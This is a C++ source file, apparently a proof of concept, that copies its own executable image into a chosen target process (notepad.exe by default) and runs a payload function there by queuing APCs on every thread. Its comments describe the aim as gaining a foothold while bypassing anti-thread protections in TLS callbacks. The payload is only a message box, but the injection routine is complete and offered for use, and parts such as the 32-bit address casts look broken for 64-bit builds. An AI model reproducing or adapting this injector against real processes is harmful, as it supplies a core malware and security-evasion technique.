// APCInjector.cpp : Copies the current PE image into a target process and executes a payload function using APC, giving us a foothold while bypassing anti-thread mechanisms in TLS callbacks.
// this means in theory we can defeat TLS callback protections /w remapping from usermode

#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <Psapi.h>

VOID CALLBACK APCFunction(ULONG_PTR dwParam) //payload function for APC injection
{
	MessageBoxA(0, "Hello from the target process!", "APC PE Injection", 0);
}

UINT64 WriteBytesToTargetProccess(UINT64 start, int size, DWORD pid)
{
	if (pid == 0)
		return 0;

	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, false, pid);

	if (!hProc)
	{
		printf("Can't open process with ID %d\n", pid);
		return 0;
	}

	LPVOID addr = VirtualAllocEx(hProc, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (addr == NULL)
	{
		printf("Can't allocate memory in pID %d: %d\n", pid, GetLastError());
		return 0;
	}

	DWORD dwOldProt = 0;
	if (!VirtualProtectEx(hProc, addr, sizeof(IMAGE_NT_HEADERS), PAGE_EXECUTE_READWRITE, &dwOldProt)) //change back to old page protections
	{
		printf("Failed to VirtualProtect on host process pNtHeaders with error %d\n", GetLastError());
		CloseHandle(hProc);
		return 0;
	}

	SIZE_T bytes_written = 0;

	if (!WriteProcessMemory(hProc, addr, (LPCVOID)start, size, &bytes_written))
	{
		printf("Can't write memory in pID %d: %d\n", pid, GetLastError());
		CloseHandle(hProc);
		return 0;
	}

	printf("Wrote bytes to target process!\n");

	return (UINT64)addr;
}

DWORD GetModuleBaseAddress(DWORD pid, const char* moduleName) 
{
	DWORD moduleBaseAddress = 0;
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
	if (hSnapshot != INVALID_HANDLE_VALUE) 
	{
		MODULEENTRY32 moduleEntry;
		moduleEntry.dwSize = sizeof(MODULEENTRY32);
		if (Module32First(hSnapshot, &moduleEntry)) 
		{
			do 
			{
				if (stricmp(moduleEntry.szModule, moduleName) == 0) 
				{
					moduleBaseAddress = (DWORD)moduleEntry.modBaseAddr;
					break;
				}
			} while (Module32Next(hSnapshot, &moduleEntry));
		}
		CloseHandle(hSnapshot);
	}
	return moduleBaseAddress;
}

FARPROC GetRemoteProcAddress(HANDLE hProcess, const char* moduleName, const char* functionName) 
{
	HMODULE hModule = GetModuleHandleA(moduleName);
	if (hModule == NULL) 
	{
		return NULL;
	}

	// Get the local address of the function
	FARPROC localProcAddress = GetProcAddress(hModule, functionName);
	if (localProcAddress == NULL) 
	{
		return NULL;
	}

	// Calculate the offset of the function within the module
	DWORD functionOffset = (DWORD)localProcAddress - (DWORD)hModule;

	// Get the base address of the module in the target process
	DWORD remoteBaseAddress = GetModuleBaseAddress(GetProcessId(hProcess), moduleName);
	if (remoteBaseAddress == NULL) 
	{
		return NULL;
	}

	// Calculate the remote address of the function
	return (FARPROC)(remoteBaseAddress + functionOffset);
}

DWORD GetProcessIdByName(const std::string& processName) 
{
	// Take a snapshot of all processes in the system
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) 
	{
		std::wcerr << L"Failed to create process snapshot\n";
		return 0;
	}

	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	// Retrieve information about the first process
	if (!Process32First(hSnapshot, &pe32)) 
	{
		std::wcerr << L"Failed to get the first process\n";
		CloseHandle(hSnapshot);
		return 0;
	}

	// Iterate over all processes in the snapshot
	do 
	{
		if (stricmp(pe32.szExeFile, processName.c_str()) == 0) 
		{
			// Match found
			DWORD processId = pe32.th32ProcessID;
			CloseHandle(hSnapshot);
			return processId;
		}
	} while (Process32Next(hSnapshot, &pe32));

	// No match found
	CloseHandle(hSnapshot);
	std::wcerr << L"Process not found\n";
	return 0;
}

bool APC_PE_Inject(const char* targetProcessName, UINT64 payloadFunction)
{
	DWORD pid = GetProcessIdByName(targetProcessName); //Target process ID

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

	if (hProcess == NULL)
	{
		printf("Failed to open process: %d\n", GetLastError());
		return false;
	}

	HMODULE hModule = GetModuleHandle(NULL);
	LPVOID baseAddress = hModule;

	MODULEINFO moduleInfo;
	GetModuleInformation(GetCurrentProcess(), hModule, &moduleInfo, sizeof(MODULEINFO));

	SIZE_T imageSize = moduleInfo.SizeOfImage; 	//Get the image size

	UINT64 remoteMemAddr = WriteBytesToTargetProccess((UINT64)hModule, (int)imageSize, pid);

	UINT64 payloadOffset = (UINT64)payloadFunction - (UINT64)hModule;

	printf("remoteMemAddr: %llX, local imageSize %d\n", remoteMemAddr, imageSize);

	HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hThreadSnap == INVALID_HANDLE_VALUE)
	{
		std::cerr << "Failed to create thread snapshot\n";
		return false;
	}

	THREADENTRY32 te32;
	te32.dwSize = sizeof(THREADENTRY32);

	// Retrieve information about the first thread
	if (!Thread32First(hThreadSnap, &te32))
	{
		std::cerr << "Failed to get the first thread\n";
		CloseHandle(hThreadSnap);
		return false;
	}

	do
	{
		if (te32.th32OwnerProcessID == pid)
		{
			std::cout << "Thread ID: " << te32.th32ThreadID << "\n";

			HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID); //traverse all threads in process since we aren't sure which ones will trigger alertable states
			
			if (hThread != NULL)
			{
				if (QueueUserAPC((PAPCFUNC)(remoteMemAddr + payloadOffset), hThread, NULL) == 0)
				{
					printf("Failed to queue APC\n");
				}
				else
				{
					printf("APC queued successfully: execute payload @ %llX\n", remoteMemAddr + payloadOffset);
				}

				CloseHandle(hThread);
			}
			else
			{
				std::cerr << "Failed to open thread: " << te32.th32ThreadID << "\n";
			}
		}
	} while (Thread32Next(hThreadSnap, &te32));

	CloseHandle(hThreadSnap);
	CloseHandle(hProcess);
	return true;
}

int main(int argc, char** argv) 
{
	char* targetProc = nullptr;

	if (argc >= 2)
	{
		targetProc = argv[1];
	}
	else
	{
		targetProc = "notepad.exe";
	}

	if (targetProc != nullptr)
	{
		if (APC_PE_Inject(targetProc, (UINT64)APCFunction))
		{
			printf("PE Injected successfully!");
		}
	}

	system("pause");
	return 0;
}

